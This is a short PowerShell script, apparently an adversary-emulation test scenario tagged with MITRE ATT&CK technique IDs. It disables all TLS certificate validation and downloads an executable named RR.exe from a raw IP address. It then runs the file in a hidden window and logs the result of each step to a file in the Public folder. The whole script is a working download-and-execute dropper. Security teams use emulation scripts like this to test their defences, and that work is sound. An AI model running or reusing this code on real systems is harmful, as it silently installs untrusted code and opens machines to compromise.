$path=Get-Location
$code= @"
        using System.Net;
        using System.Security.Cryptography.X509Certificates;
        public class TrustAllCertsPolicy : ICertificatePolicy {
            public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) {
                return true;
            }
        }
"@
Add-Type -TypeDefinition $code -Language CSharp
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$URL="https://3.22.60.53/products/OCELD45724f7362862db"
$iso_name="RR.exe"
$ESCENARIO = "OCE-SCE-457"

$full_path=Join-Path -Path $path -ChildPath $iso_name

$commonPath = [Environment]::GetFolderPath("CommonDocuments")
$publicPath = Split-Path -Path $commonPath -Parent

try{
    Invoke-WebRequest -URI $URL -OutFile $full_path
    "["+ (Get-Date -Format "dd/MM/yyyy HH:mm:ss") + "]" + " [OCE-DW-16] [T1105] [" + $full_path +"]" >> ($publicPath + "\" + $ESCENARIO + ".txt")
} catch {
    "[" + (Get-Date -Format "dd/MM/yyyy HH:mm:ss") + "]" + " [OCE-DW-16] [T1105] [0]" >> ($publicPath + "\" + $ESCENARIO + ".txt")
}

try{
    Start-Process -FilePath $full_path -WindowStyle Hidden
    "["+ (Get-Date -Format "dd/MM/yyyy HH:mm:ss") + "]" + " [OCE-DW-16] [T1059.001] [1]" >> ($publicPath + "\" + $ESCENARIO + ".txt")
} catch {
    "[" + (Get-Date -Format "dd/MM/yyyy HH:mm:ss") + "]" + " [OCE-DW-16] [T1059.001] [0]" >> ($publicPath + "\" + $ESCENARIO + ".txt")
}
 